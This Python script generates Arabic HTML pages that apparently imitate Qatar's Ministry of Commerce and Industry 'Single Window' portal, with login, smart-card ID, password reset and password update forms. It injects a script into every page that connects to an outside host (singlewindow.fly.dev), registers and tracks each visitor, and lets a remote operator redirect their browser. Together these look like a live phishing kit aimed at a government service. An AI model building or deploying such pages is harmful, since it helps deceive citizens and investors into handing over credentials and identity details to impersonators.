from pathlib import Path

# Tracker script (same as inject_tracker.py)
TRACKER = """<script>
(function(){
  var SVID=localStorage.getItem('visitorId');
  var s=document.createElement('script');
  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
  s.onload=function(){
    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
    var m={'/sinwinqa/':'الصفحة الرئيسية','/sinwinqa/service':'صفحة الخدمات','/sinwinqa/login':'تسجيل الدخول','/sinwinqa/reset':'نسيت كلمة المرور','/sinwinqa/update':'تحديث كلمة المرور'};
    function g(){var p=window.location.pathname;if(p.includes('/sinwinqa/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/sinwinqa/services/','')).replace(/-/g,' ').replace('.html','');return m[p]||p;}
    sock.on('connect',function(){
      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
      sock.emit('visitor:pageEnter',g());
    });
    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
    sock.on('visitor:navigate',function(page){
      if(!page)return;
      var p=page.startsWith('/')?page:'/'+page;
      window.location.href=p;
    });
    window._sw_socket=sock;
  };
  document.head.appendChild(s);
})();
</script>"""

COMMON_CSS = """
:root {
  --primary: #1a3a6b;
  --primary-dark: #0d2447;
  --primary-light: #e8f0fe;
  --accent: #f0c040;
  --text: #1a2b4a;
  --text-light: #6b7280;
  --border: #dde3ef;
  --bg: #f5f7fa;
  --white: #ffffff;
  --shadow: 0 2px 12px rgba(0,0,0,0.08);
  --radius: 12px;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; }
body {
  font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
  direction: rtl;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  line-height: 1.6;
}
a { text-decoration: none; color: inherit; }

/* ===== HEADER ===== */
.sw-header {
  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
  padding: 0 24px;
  height: 64px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  box-shadow: 0 2px 12px rgba(0,0,0,0.2);
  position: sticky;
  top: 0;
  z-index: 100;
}
.sw-logo {
  display: flex;
  align-items: center;
  gap: 12px;
}
.sw-logo img {
  height: 40px;
  width: auto;
}
.sw-logo-text {
  color: white;
  font-size: 15px;
  font-weight: 700;
  line-height: 1.2;
}
.sw-logo-text small {
  font-size: 11px;
  font-weight: 400;
  opacity: 0.75;
  display: block;
  letter-spacing: 1px;
}
.sw-nav {
  display: flex;
  align-items: center;
  gap: 4px;
}
.sw-nav a {
  color: rgba(255,255,255,0.85);
  font-size: 14px;
  padding: 8px 14px;
  border-radius: 8px;
  transition: all 0.2s;
  font-weight: 500;
}
.sw-nav a:hover, .sw-nav a.active {
  background: rgba(255,255,255,0.15);
  color: white;
}
.sw-nav .lang-btn {
  color: rgba(255,255,255,0.6);
  font-size: 12px;
  border: 1px solid rgba(255,255,255,0.2);
  padding: 5px 10px;
}

/* ===== HERO ===== */
.sw-hero {
  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 60%, #1e4080 100%);
  padding: 60px 24px 80px;
  text-align: center;
  color: white;
  position: relative;
  overflow: hidden;
}
.sw-hero::after {
  content: '';
  position: absolute;
  bottom: -1px;
  left: 0;
  right: 0;
  height: 60px;
  background: var(--bg);
  clip-path: ellipse(55% 100% at 50% 100%);
}
.sw-hero h1 {
  font-size: clamp(22px, 4vw, 36px);
  font-weight: 800;
  color: var(--accent);
  margin-bottom: 12px;
}
.sw-hero p {
  font-size: clamp(14px, 2vw, 17px);
  opacity: 0.85;
  max-width: 600px;
  margin: 0 auto;
}

/* ===== CARDS ===== */
.sw-container {
  max-width: 1100px;
  margin: 0 auto;
  padding: 0 20px;
}
.sw-card {
  background: var(--white);
  border-radius: 16px;
  padding: 32px;
  box-shadow: var(--shadow);
  border: 1px solid rgba(0,0,0,0.04);
}

/* ===== FORMS ===== */
.sw-form-group {
  margin-bottom: 18px;
}
.sw-form-group label {
  display: block;
  font-size: 13px;
  font-weight: 600;
  color: var(--text-light);
  margin-bottom: 7px;
}
.sw-input {
  width: 100%;
  padding: 12px 16px;
  border: 1.5px solid var(--border);
  border-radius: 10px;
  font-size: 14px;
  font-family: inherit;
  direction: rtl;
  background: #f8faff;
  transition: all 0.2s;
  outline: none;
  color: var(--text);
}
.sw-input:focus {
  border-color: var(--primary);
  background: white;
  box-shadow: 0 0 0 3px rgba(26,58,107,0.08);
}
.sw-btn {
  display: block;
  width: 100%;
  padding: 14px 24px;
  border: none;
  border-radius: 10px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  font-family: inherit;
  transition: all 0.2s;
  text-align: center;
  margin-bottom: 12px;
}
.sw-btn-primary {
  background: linear-gradient(135deg, var(--primary), var(--primary-dark));
  color: white;
}
.sw-btn-primary:hover {
  transform: translateY(-1px);
  box-shadow: 0 4px 16px rgba(26,58,107,0.3);
}
.sw-btn-secondary {
  background: white;
  color: var(--primary);
  border: 1.5px solid var(--primary);
}
.sw-btn-secondary:hover {
  background: var(--primary-light);
}
.sw-divider {
  text-align: center;
  color: var(--text-light);
  font-size: 13px;
  margin: 16px 0;
  position: relative;
}
.sw-divider::before, .sw-divider::after {
  content: '';
  position: absolute;
  top: 50%;
  width: 42%;
  height: 1px;
  background: var(--border);
}
.sw-divider::before { right: 0; }
.sw-divider::after { left: 0; }
.sw-link {
  color: var(--primary);
  font-weight: 600;
  font-size: 13px;
}
.sw-link:hover { text-decoration: underline; }
.sw-text-center { text-align: center; }
.sw-mt-12 { margin-top: 12px; }
.sw-mt-20 { margin-top: 20px; }

/* ===== FOOTER ===== */
.sw-footer {
  background: var(--primary-dark);
  color: rgba(255,255,255,0.65);
  text-align: center;
  padding: 28px 20px;
  font-size: 13px;
  margin-top: 48px;
}
.sw-footer p { margin: 4px 0; }
.sw-footer a { color: rgba(255,255,255,0.65); }

/* ===== SERVICES ===== */
.sw-services-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 16px;
  padding: 32px 0 48px;
}
.sw-service-card {
  background: var(--white);
  border-radius: 14px;
  padding: 20px;
  box-shadow: var(--shadow);
  display: flex;
  align-items: flex-start;
  gap: 16px;
  border: 1.5px solid transparent;
  transition: all 0.2s;
  cursor: pointer;
}
.sw-service-card:hover {
  transform: translateY(-3px);
  box-shadow: 0 6px 24px rgba(0,0,0,0.12);
  border-color: var(--primary);
}
.sw-service-icon {
  width: 52px;
  height: 52px;
  background: linear-gradient(135deg, var(--primary-light), #c8d8f8);
  border-radius: 14px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}
.sw-service-icon svg {
  width: 26px;
  height: 26px;
  fill: var(--primary);
}
.sw-service-info h3 {
  font-size: 15px;
  font-weight: 700;
  color: var(--primary);
  margin-bottom: 6px;
}
.sw-service-info p {
  font-size: 13px;
  color: var(--text-light);
  line-height: 1.5;
}
.sw-section-header {
  text-align: center;
  padding: 40px 0 8px;
}
.sw-section-header h2 {
  font-size: clamp(20px, 3vw, 28px);
  font-weight: 800;
  color: var(--primary);
  margin-bottom: 8px;
}
.sw-section-header p {
  font-size: 15px;
  color: var(--text-light);
}

/* ===== LOGIN PAGE LAYOUT ===== */
.sw-login-layout {
  display: grid;
  grid-template-columns: 1fr 420px;
  gap: 40px;
  align-items: center;
  padding: 48px 0 64px;
}
.sw-login-info h2 {
  font-size: clamp(24px, 3vw, 36px);
  font-weight: 800;
  color: var(--primary);
  margin-bottom: 16px;
  line-height: 1.3;
}
.sw-login-info p {
  font-size: 15px;
  color: var(--text-light);
  line-height: 1.7;
  margin-bottom: 24px;
}
.sw-feature-list {
  list-style: none;
}
.sw-feature-list li {
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 14px;
  color: var(--text);
  margin-bottom: 12px;
}
.sw-feature-list li::before {
  content: '✓';
  width: 22px;
  height: 22px;
  background: var(--primary);
  color: white;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 12px;
  font-weight: 700;
  flex-shrink: 0;
}
.sw-card-title {
  font-size: 17px;
  font-weight: 700;
  color: var(--primary);
  text-align: center;
  margin-bottom: 6px;
}
.sw-card-subtitle {
  font-size: 13px;
  color: var(--text-light);
  text-align: center;
  margin-bottom: 24px;
}
.sw-logos-row {
  display: flex;
  gap: 16px;
  justify-content: center;
  align-items: center;
  margin-bottom: 20px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--border);
}
.sw-logos-row img {
  height: 36px;
  width: auto;
  object-fit: contain;
}

/* ===== RESPONSIVE ===== */
@media (max-width: 768px) {
  .sw-header { padding: 0 16px; height: 56px; }
  .sw-logo img { height: 32px; }
  .sw-logo-text { font-size: 13px; }
  .sw-nav a { font-size: 13px; padding: 6px 10px; }
  .sw-hero { padding: 40px 16px 60px; }
  .sw-login-layout {
    grid-template-columns: 1fr;
    padding: 24px 0 40px;
    gap: 24px;
  }
  .sw-login-info { order: 2; }
  .sw-card { padding: 24px 18px; }
  .sw-services-grid {
    grid-template-columns: 1fr;
    padding: 20px 0 32px;
  }
  .sw-container { padding: 0 14px; }
}
@media (max-width: 480px) {
  .sw-nav .lang-btn { display: none; }
  .sw-logo-text small { display: none; }
}
"""

SERVICE_ICON_SVG = '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>'

SERVICES_DATA = [
  ("خدمة الشهادات", "تُمكّن هذه الخدمة جميع المستثمرين من طلب شهادات لمن يهمه الأمر، واستخراج مستخرج السجل التجاري والرخص التجارية صادرة من وزارة التجارة والصناعة.", "services/خدمة-الشهادات.html"),
  ("طلب إصدار موافقة استقدام عمالية", "طلب إصدار موافقة استقدام عمالية للمنشآت التجارية.", "services/طلب-إصدار-موافقة-استقدام-عمالية.html"),
  ("إصدار رخصة إعلان", "تتيح هذه الخدمة للمستثمرين إصدار تصريح لافتات للأنواع التالية: التصاريح السنوية والمؤقتة.", "services/إصدار-رخصة-إعلان.html"),
  ("إصدار الرخصة التجارية", "تتيح هذه الخدمة للمستثمر إمكانية إصدار الرخصة التجارية بعد الانتهاء من إصدار السجل التجاري.", "services/إصدار-الرخصة-التجارية.html"),
  ("إغلاق شركة", "تتيح هذه الخدمة للمستثمرين الذين لديهم شركات قائمة التقدم بطلب إغلاق الشركة كاملة وتصفيتها.", "services/إغلاق-شركة.html"),
  ("إضافة رخصة تجارية فرعية", "تتيح هذه الخدمة للمستثمرين الذين لديهم رخص تجارية تقديم طلب للحصول على رخصة تجارية فرعية.", "services/إضافة-رخصة-تجارية-فرعية.html"),
  ("إدارة فروع الشركات الأجنبية", "تتيح هذه الخدمة لمدراء فروع الشركات الأجنبية استكمال جميع الإجراءات المتعلقة بإدارة فروع الشركات الأجنبية.", "services/إدارة-فروع-الشركات-الأجنبية.html"),
  ("التجديد الشامل", "تتيح هذه الخدمة للمستثمرين تقديم طلب تجديد شامل يضم جميع الرخص القابلة للتجديد.", "services/التجديد-الشامل.html"),
  ("استكمال التأسيس الشامل", "تتيح هذه الخدمة للمستثمرين إمكانية استكمال إجراءات الحصول على كافة الرخص اللازمة للبدء بمزاولة الأعمال.", "services/طلب-استكمال-التأسيس-الشامل.html"),
  ("التأسيس الشامل", "تتيح هذه الخدمة للمستثمر إمكانية الحصول على كافة الرخص اللازمة للبدء بمزاولة الأعمال الاقتصادية.", "services/التأسيس-الشامل.html"),
  ("حجز الاسم التجاري", "تتيح هذه الخدمة امكانية اختيار وحجز اسم تجاري لمدة مئة وثمانون يوماً.", "services/حجز-الاسم-التجاري.html"),
  ("تجديد رخصة إعلان", "تتيح هذه الخدمة تجديد رخصة إعلان مؤقتة أو سنوية أو دائمة.", "services/تجديد-رخصة-إعلان.html"),
  ("تقديم سجل معلومات المستفيدين الحقيقيين", "من خلال هذه الخدمة، يمكنك التصريح بالمستفيد أو المستفيدين الحقيقيين النهائيين لشركتك.", "services/تقديم-سجل-معلومات-المستفيدين-الحقيقيين.html"),
  ("التعديل الشامل", "تتيح هذه الخدمة للمستثمرين بتعديل جميع مكونات الشركة في مكان واحد.", "services/التعديل-الشامل.html"),
  ("إلغاء رخصة إعلان", "تتيح هذه الخدمة إلغاء رخصة إعلان مؤقت أو سنوي.", "services/إلغاء-رخصة-إعلان.html"),
  ("إضافة فرع", "تتيح هذه الخدمة للمستثمرين الذين لديهم شركات قائمة التقديم على إضافة فرع للشركة القائمة.", "services/إضافة-فرع.html"),
  ("استكمال تأسيس مصنع", "تتيح هذه الخدمة المجال للمستثمرين لاستكمال إجراءات تأسيس المصنع من الموافقة المبدئية.", "services/استكمال-تأسيس-مصنع.html"),
  ("تأسيس مصنع", "توفّر وزارة التجارة والصناعة أراضٍ صناعية للمشاريع الصناعية الواعدة ذات القيمة المضافة للاقتصاد المحلي.", "services/طلب-تأسيس-مصنع.html"),
  ("طلب مستشار تأسيس الأعمال", "احصل على إرشاد سريع ومخصص حول المتطلبات والرسوم والمستندات والمدة المتوقعة.", "services/طلب-مستشار-تأسيس-الأعمال.html"),
]

def html_template(title, body_content, extra_css=""):
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title} | النافذة الواحدة</title>
  <style>
{COMMON_CSS}
{extra_css}
  </style>
</head>
<body>
{body_content}
{TRACKER}
</body>
</html>"""

HEADER_HOME = """
<header class="sw-header">
  <div class="sw-logo">
    <img src="/sinwinqa_/sinwinqa_assets/f9b6577f_qjka_png" alt="النافذة الواحدة" onerror="this.style.display='none'">
    <div class="sw-logo-text">النافذة الواحدة <small>SINGLE WINDOW</small></div>
  </div>
  <nav class="sw-nav">
    <a href="/sinwinqa/service">الخدمات</a>
    <a href="#" class="lang-btn">English</a>
  </nav>
</header>"""

HEADER_SERVICE = """
<header class="sw-header">
  <div class="sw-logo">
    <img src="/sinwinqa_/sinwinqa_assets/f9b6577f_qjka_png" alt="النافذة الواحدة" onerror="this.style.display='none'">
    <div class="sw-logo-text">النافذة الواحدة <small>SINGLE WINDOW</small></div>
  </div>
  <nav class="sw-nav">
    <a href="/sinwinqa/">تسجيل الدخول</a>
    <a href="#" class="lang-btn">English</a>
  </nav>
</header>"""

FOOTER = """
<footer class="sw-footer">
  <p>© 2024 النافذة الواحدة - وزارة التجارة والصناعة - دولة قطر</p>
  <p style="margin-top:6px;font-size:12px;">جميع الحقوق محفوظة</p>
</footer>"""

# ============================================================
# HOME / LOGIN PAGE
# ============================================================
def build_home():
    services_preview = ""
    for name, desc, link in SERVICES_DATA[:6]:
        services_preview += f"""
        <a href="/sinwinqa/{link}" class="sw-service-card">
          <div class="sw-service-icon">{SERVICE_ICON_SVG}</div>
          <div class="sw-service-info">
            <h3>{name}</h3>
            <p>{desc[:80]}...</p>
          </div>
        </a>"""

    body = f"""
{HEADER_HOME}
<div class="sw-hero">
  <h1>مستشار تأسيس الاعمال</h1>
  <p>احصل على إرشاد سريع ومخصص حول المتطلبات والرسوم والمستندات والمدة المتوقعة قبل تقديم طلب التأسيس الرسمي</p>
</div>

<div class="sw-container">
  <div class="sw-login-layout">
    <div class="sw-login-info">
      <h2>منظومة النافذة الواحدة لخدمات الأعمال</h2>
      <p>تتيح منظومة النافذة الواحدة للمستثمرين إنجاز جميع إجراءات التأسيس والتجديد والتعديل في مكان واحد بكل سهولة ويسر.</p>
      <ul class="sw-feature-list">
        <li>إصدار وتجديد الرخص التجارية</li>
        <li>تأسيس الشركات والمنشآت</li>
        <li>إدارة الفروع والرخص الفرعية</li>
        <li>خدمات الشهادات والوثائق الرسمية</li>
      </ul>
    </div>
    <div>
      <div class="sw-card">
        <div class="sw-logos-row">
          <span style="font-size:15px;font-weight:800;color:#1a3a6b;letter-spacing:1px;">تـوثـيـق</span>
          <div style="width:1px;height:30px;background:#e0e0e0;"></div>
          <span style="font-size:12px;color:#555;font-weight:600;">هوية قطر الرقمية</span>
        </div>
        <p class="sw-card-title">تسجيل الدخول عن طريق نظام توثيق</p>
        <p class="sw-card-subtitle">الرجاء إدخال المعلومات المطلوبة</p>
        <div class="sw-form-group">
          <label>اسم المستخدم</label>
          <input class="sw-input" id="sw-username" type="text" placeholder="ادخل اسم المستخدم">
        </div>
        <div class="sw-form-group">
          <label>كلمة المرور</label>
          <input class="sw-input" id="sw-password" type="password" placeholder="كلمة المرور">
        </div>
        <div style="text-align:left;margin-bottom:16px;">
          <a href="/sinwinqa/reset" class="sw-link" style="font-size:13px;">هل نسيت كلمة المرور؟</a>
        </div>
        <a href="/sinwinqa/update" class="sw-btn sw-btn-primary">تسجيل الدخول</a>
        <div class="sw-divider">أو</div>
        <a href="/sinwinqa/login" class="sw-btn sw-btn-secondary">الدخول بالبطاقة الذكية</a>
        <p class="sw-text-center sw-mt-12" style="font-size:13px;color:#666;">
          لا تمتلك حساب حتى الآن؟ <a href="/sinwinqa/register" class="sw-link">تسجيل الحساب</a>
        </p>
      </div>
    </div>
  </div>

  <div class="sw-section-header">
    <h2>أبرز الخدمات</h2>
    <p>تصفح أكثر الخدمات استخداماً</p>
  </div>
  <div class="sw-services-grid">
    {services_preview}
  </div>
  <div class="sw-text-center" style="padding-bottom:40px;">
    <a href="/sinwinqa/service" class="sw-btn sw-btn-secondary" style="display:inline-block;width:auto;padding:12px 32px;">عرض جميع الخدمات</a>
  </div>
</div>
{FOOTER}"""
    return html_template("الصفحة الرئيسية", body)

# ============================================================
# SERVICES PAGE
# ============================================================
def build_services():
    cards = ""
    for name, desc, link in SERVICES_DATA:
        cards += f"""
    <a href="/sinwinqa/{link}" class="sw-service-card">
      <div class="sw-service-icon">{SERVICE_ICON_SVG}</div>
      <div class="sw-service-info">
        <h3>{name}</h3>
        <p>{desc}</p>
      </div>
    </a>"""

    body = f"""
{HEADER_SERVICE}
<div class="sw-hero">
  <h1>الخدمات الإلكترونية</h1>
  <p>جميع خدمات وزارة التجارة والصناعة في مكان واحد</p>
</div>
<div class="sw-container">
  <div class="sw-section-header">
    <h2>تصفح الخدمات</h2>
    <p>اختر الخدمة التي تحتاجها من القائمة أدناه</p>
  </div>
  <div class="sw-services-grid">
    {cards}
  </div>
</div>
{FOOTER}"""
    return html_template("الخدمات", body)

# ============================================================
# REGISTER PAGE
# ============================================================
def build_register():
    body = f"""
{HEADER_HOME}
<div class="sw-hero" style="padding:40px 24px 60px;">
  <h1 style="font-size:clamp(20px,3vw,30px);">تسجيل حساب جديد</h1>
  <p>أنشئ حسابك في منظومة النافذة الواحدة</p>
</div>
<div class="sw-container">
  <div style="max-width:480px;margin:40px auto 60px;">
    <div class="sw-card">
      <p class="sw-card-title">إنشاء حساب</p>
      <p class="sw-card-subtitle">الرجاء إدخال بياناتك لإنشاء حساب جديد</p>
      <div class="sw-form-group">
        <label>اسم المستخدم</label>
        <input class="sw-input" type="text" placeholder="ادخل اسم المستخدم">
      </div>
      <div class="sw-form-group">
        <label>البريد الإلكتروني</label>
        <input class="sw-input" type="email" placeholder="example@email.com" dir="ltr">
      </div>
      <div class="sw-form-group">
        <label>كلمة المرور</label>
        <input class="sw-input" type="password" placeholder="كلمة المرور">
      </div>
      <div class="sw-form-group">
        <label>تأكيد كلمة المرور</label>
        <input class="sw-input" type="password" placeholder="أعد إدخال كلمة المرور">
      </div>
      <a href="/sinwinqa/" class="sw-btn sw-btn-primary">تسجيل</a>
      <p class="sw-text-center sw-mt-12" style="font-size:13px;color:#666;">
        لديك حساب بالفعل؟ <a href="/sinwinqa/" class="sw-link">تسجيل الدخول</a>
      </p>
    </div>
  </div>
</div>
{FOOTER}"""
    return html_template("تسجيل حساب", body)

# ============================================================
# RESET PAGE
# ============================================================
def build_reset():
    body = f"""
{HEADER_HOME}
<div class="sw-hero" style="padding:40px 24px 60px;">
  <h1 style="font-size:clamp(20px,3vw,30px);">نسيت كلمة المرور؟</h1>
  <p>أدخل بريدك الإلكتروني لاستعادة كلمة المرور</p>
</div>
<div class="sw-container">
  <div style="max-width:440px;margin:40px auto 60px;">
    <div class="sw-card">
      <p class="sw-card-title">استعادة كلمة المرور</p>
      <p class="sw-card-subtitle">سنرسل لك رابط إعادة تعيين كلمة المرور على بريدك الإلكتروني</p>
      <div class="sw-form-group">
        <label>البريد الإلكتروني</label>
        <input class="sw-input" type="email" placeholder="example@email.com" dir="ltr">
      </div>
      <a href="/sinwinqa/" class="sw-btn sw-btn-primary">إرسال</a>
      <p class="sw-text-center sw-mt-12">
        <a href="/sinwinqa/" class="sw-link">العودة لتسجيل الدخول</a>
      </p>
    </div>
  </div>
</div>
{FOOTER}"""
    return html_template("نسيت كلمة المرور", body)

# ============================================================
# UPDATE PAGE
# ============================================================
def build_update():
    body = f"""
{HEADER_HOME}
<div class="sw-hero" style="padding:40px 24px 60px;">
  <h1 style="font-size:clamp(20px,3vw,30px);">تحديث كلمة المرور</h1>
  <p>أدخل كلمة المرور الجديدة</p>
</div>
<div class="sw-container">
  <div style="max-width:440px;margin:40px auto 60px;">
    <div class="sw-card">
      <p class="sw-card-title">كلمة مرور جديدة</p>
      <p class="sw-card-subtitle">الرجاء إدخال كلمة المرور الجديدة</p>
      <div class="sw-form-group">
        <label>كلمة المرور الجديدة</label>
        <input class="sw-input" type="password" placeholder="كلمة المرور الجديدة">
      </div>
      <div class="sw-form-group">
        <label>تأكيد كلمة المرور</label>
        <input class="sw-input" type="password" placeholder="أعد إدخال كلمة المرور">
      </div>
      <a href="/sinwinqa/" class="sw-btn sw-btn-primary">تحديث</a>
    </div>
  </div>
</div>
{FOOTER}"""
    return html_template("تحديث كلمة المرور", body)

# ============================================================
# LOGIN (SMART CARD) PAGE
# ============================================================
def build_login():
    body = f"""
{HEADER_HOME}
<div class="sw-hero" style="padding:40px 24px 60px;">
  <h1 style="font-size:clamp(20px,3vw,30px);">الدخول بالبطاقة الذكية</h1>
  <p>تسجيل الدخول باستخدام هوية قطر الرقمية</p>
</div>
<div class="sw-container">
  <div style="max-width:440px;margin:40px auto 60px;">
    <div class="sw-card">
      <p class="sw-card-title">البطاقة الذكية</p>
      <p class="sw-card-subtitle">الرجاء إدخال بيانات البطاقة الذكية</p>
      <div class="sw-form-group">
        <label>رقم الهوية</label>
        <input class="sw-input" type="text" placeholder="ادخل رقم الهوية" dir="ltr">
      </div>
      <div class="sw-form-group">
        <label>كلمة المرور</label>
        <input class="sw-input" type="password" placeholder="كلمة المرور">
      </div>
      <a href="/sinwinqa/" class="sw-btn sw-btn-primary">دخول</a>
      <div class="sw-divider">أو</div>
      <a href="/sinwinqa/" class="sw-btn sw-btn-secondary">تسجيل الدخول بكلمة المرور</a>
    </div>
  </div>
</div>
{FOOTER}"""
    return html_template("الدخول بالبطاقة الذكية", body)

# ============================================================
# SERVICE DETAIL PAGE
# ============================================================
def build_service_detail(name, desc):
    body = f"""
{HEADER_SERVICE}
<div class="sw-hero" style="padding:40px 24px 60px;">
  <h1 style="font-size:clamp(18px,3vw,28px);line-height:1.4;">{name}</h1>
</div>
<div class="sw-container">
  <div style="max-width:680px;margin:40px auto 60px;">
    <div class="sw-card">
      <p style="font-size:15px;color:#444;line-height:1.8;margin-bottom:28px;">{desc}</p>
      <a href="/sinwinqa/" class="sw-btn sw-btn-primary">تسجيل الدخول للمتابعة</a>
      <a href="/sinwinqa/service" class="sw-btn sw-btn-secondary">العودة لقائمة الخدمات</a>
    </div>
  </div>
</div>
{FOOTER}"""
    return html_template(name, body)

# ============================================================
# WRITE FILES
# ============================================================
base = Path('/home/ubuntu/singlewindoo/client/public/sinwinqa')
services_dir = base / 'services'

pages = {
    base / 'index.html': build_home(),
    base / 'service.html': build_services(),
    base / 'register.html': build_register(),
    base / 'reset.html': build_reset(),
    base / 'update.html': build_update(),
    base / 'login.html': build_login(),
}

for path, content in pages.items():
    path.write_text(content, encoding='utf-8')
    print(f"✅ Built: {path.name}")

# Service detail pages
for name, desc, link in SERVICES_DATA:
    fname = link.replace('services/', '')
    fpath = services_dir / fname
    fpath.write_text(build_service_detail(name, desc), encoding='utf-8')
    print(f"✅ Built: services/{fname}")

print(f"\n✅ Done! Built {len(pages) + len(SERVICES_DATA)} pages")
